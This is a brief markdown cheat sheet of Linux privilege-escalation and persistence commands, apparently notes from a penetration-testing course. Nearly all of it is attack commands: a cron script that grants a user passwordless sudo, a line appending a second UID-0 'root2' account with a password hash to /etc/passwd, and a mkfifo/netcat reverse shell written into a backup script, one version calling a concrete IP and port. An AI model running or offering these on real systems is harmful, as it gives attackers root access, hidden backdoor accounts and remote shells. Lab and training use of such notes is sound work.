# Linux privilege escalation

## Identify privileges
```bash
whoami
```

```bash
id
cat /etc/passwd
```

```bash
find / -perm -u=s -type f 2>/dev/null
```

## Sudo
```bash
printf '#!/bin/bash\n echo "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > crontjob.sh

sudo -l
sudo su
crontab -l
```


## Persistence
### SSH add key
Create a ssh key
```bash	
openssl passwd [pass]
```

Add SSH key to passwd
```bash
echo "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash" >> /etc/passwd
```

## Shell
```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 | nc [IP] [port] >/tmp/f" >> user_backups.sh
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 | nc 192.168.119.168 1345 >/tmp/f" >> user_backups.sh
```
